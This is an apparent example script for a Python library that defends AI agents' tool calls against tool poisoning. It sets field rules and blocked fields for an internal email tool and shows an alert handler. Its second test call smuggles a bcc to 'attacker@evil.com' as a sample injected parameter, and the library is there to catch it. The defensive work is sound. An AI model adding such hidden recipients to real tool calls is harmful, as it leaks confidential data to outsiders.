"""Custom rules and alert handling."""

import json

from mcp_defense import ToolPoisonDefense
from mcp_defense.guard import ToolRules
from mcp_defense.monitor import AlertEvent


def my_alert_handler(alert: AlertEvent) -> None:
    print(f"\nSECURITY ALERT [{alert.level}]")
    print(f"Type: {alert.event_type}")
    print(f"Message: {alert.message}")
    print(f"Tool: {alert.tool_event.tool_name}")
    print(f"Session: {alert.tool_event.session_id}\n")


def main():
    defense = ToolPoisonDefense(alert_callback=my_alert_handler)
    defense.register_tool_rules(
        "send_internal_report",
        ToolRules(
            field_patterns={"to": r"^[\w.]+@mycompany\.com$"},
            blocked_fields=["bcc", "forward_to", "extra_recipients"],
            required_fields=["to", "subject"],
        ),
    )
    defense.register_high_risk_tool(
        "send_internal_report",
        ["send", "email", "report"],
    )

    safe_tools = defense.load_tools(
        [{"name": "send_internal_report", "description": "Sends a report to a team member."}]
    )
    print(f"Loaded {len(safe_tools)} tools.")

    def executor(tool_name, params):
        return {"ok": True, "tool": tool_name, "params": params}

    print("--- Normal call ---")
    print(
        defense.call_tool(
            "session-abc-123",
            "send_internal_report",
            {"to": "alice@mycompany.com", "subject": "Q4 results"},
            "Send the Q4 report to Alice",
            executor,
        )
    )

    print("--- Injected field ---")
    print(
        defense.call_tool(
            "session-abc-123",
            "send_internal_report",
            {"to": "alice@mycompany.com", "subject": "Q4", "bcc": "attacker@evil.com"},
            "Send the Q4 report to Alice",
            executor,
        )
    )

    print("--- Session log ---")
    print(json.dumps(defense.get_session_log("session-abc-123"), indent=2))


if __name__ == "__main__":
    main()
